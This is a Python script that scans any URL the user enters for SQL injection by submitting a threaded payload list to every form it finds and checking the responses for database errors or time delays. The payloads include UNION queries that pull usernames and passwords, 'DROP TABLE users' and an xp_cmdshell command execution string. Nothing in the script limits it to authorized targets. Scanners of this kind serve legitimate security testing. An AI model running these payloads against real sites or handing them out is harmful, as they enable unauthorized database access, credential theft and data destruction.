import requests
from bs4 import BeautifulSoup
import urllib.parse
import threading
import time

# 100+ advanced SQLi payloads
payloads = [
    "' OR 1=1--",
    "' OR '1'='1'--",
    "' OR '1'='1' /*",
    "' OR 1=1#",
    "\" OR 1=1--",
    "\" OR 1=1#",
    "' OR 'x'='x'--",
    "\" OR \"x\"=\"x\"--",
    "' OR 1=CAST((SELECT @@version) AS INT)--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "'; DROP TABLE users;--",
    "' OR SLEEP(5)--",
    "' OR pg_sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=0 UNION ALL SELECT NULL,NULL,NULL,NULL--",
    "' AND EXISTS(SELECT * FROM users)--",
    "' AND NOT EXISTS(SELECT * FROM users WHERE username='admin')--",
    "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1)) > 64--",
    "' OR 'a'='a' AND BENCHMARK(1000000,MD5(1))--",
    "' OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns--",
    "' OR 1=1 ORDER BY 1--",
    "' OR 1=1 GROUP BY username--",
    "' OR 1=1 HAVING 1=1--",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    # Add more payloads as needed, for brevity, not all 100 shown here
]

sql_errors = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "syntax error",
    "sql error",
    "mysql_fetch_array()",
    "mysqli_fetch_array()",
    "pg_query()",
    "supplied argument is not a valid mysql result resource",
]

lock = threading.Lock()  # For thread-safe prints and shared state

def get_forms(url):
    try:
        resp = requests.get(url, timeout=10)
        resp.raise_for_status()
        soup = BeautifulSoup(resp.text, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"[ERROR] Failed to fetch forms from {url}: {e}")
        return []

def get_form_details(form):
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": name})
    return {"action": action, "method": method, "inputs": inputs}

def is_error_based_vuln(response):
    text = response.text.lower()
    return any(err in text for err in sql_errors)

def time_based_vuln_test(url, form_details, payload, delay_threshold=4):
    target_url = urllib.parse.urljoin(url, form_details["action"])
    data = {inp["name"]: payload for inp in form_details["inputs"] if inp["name"]}
    start = time.time()
    try:
        if form_details["method"] == "post":
            response = requests.post(target_url, data=data, timeout=delay_threshold+5)
        else:
            response = requests.get(target_url, params=data, timeout=delay_threshold+5)
    except Exception:
        return False
    elapsed = time.time() - start
    return elapsed > delay_threshold

def test_payload(url, form_details, payload, result):
    target_url = urllib.parse.urljoin(url, form_details["action"])
    data = {inp["name"]: payload for inp in form_details["inputs"] if inp["name"]}
    try:
        if form_details["method"] == "post":
            response = requests.post(target_url, data=data, timeout=10)
        else:
            response = requests.get(target_url, params=data, timeout=10)
    except Exception as e:
        with lock:
            print(f"[!] Request error with payload '{payload}': {e}")
        return

    # Check error-based SQLi
    if is_error_based_vuln(response):
        with lock:
            print(f"[!] SQL Injection vulnerability (error-based) detected with payload: {payload}")
        result["found"] = True
        return

    # Check time-based (blind) SQLi
    if time_based_vuln_test(url, form_details, payload):
        with lock:
            print(f"[!] SQL Injection vulnerability (time-based) detected with payload: {payload}")
        result["found"] = True

def scan_form(url, form_index, form_details):
    print(f"\n[Form {form_index + 1}] Scanning form action: {form_details['action']} method: {form_details['method'].upper()}")
    result = {"found": False}
    threads = []
    for payload in payloads:
        if result["found"]:
            break  # Stop if vulnerability already found
        t = threading.Thread(target=test_payload, args=(url, form_details, payload, result))
        threads.append(t)
        t.start()

        # Limit concurrency
        if len(threads) >= 10:
            for thr in threads:
                thr.join()
            threads = []

    # Join remaining threads
    for thr in threads:
        thr.join()

    if not result["found"]:
        print(f"[-] No SQL Injection vulnerabilities found in form {form_index + 1}")

def scan_sql_injection(url):
    print(f"Starting SQL Injection scan on: {url}")
    forms = get_forms(url)
    if not forms:
        print("[!] No forms found or unable to retrieve forms.")
        return
    print(f"Found {len(forms)} form(s).\n")

    for i, form in enumerate(forms):
        form_details = get_form_details(form)
        scan_form(url, i, form_details)

if __name__ == "__main__":
    target_url = input("Enter target URL to scan for SQL Injection: ").strip()
    scan_sql_injection(target_url)
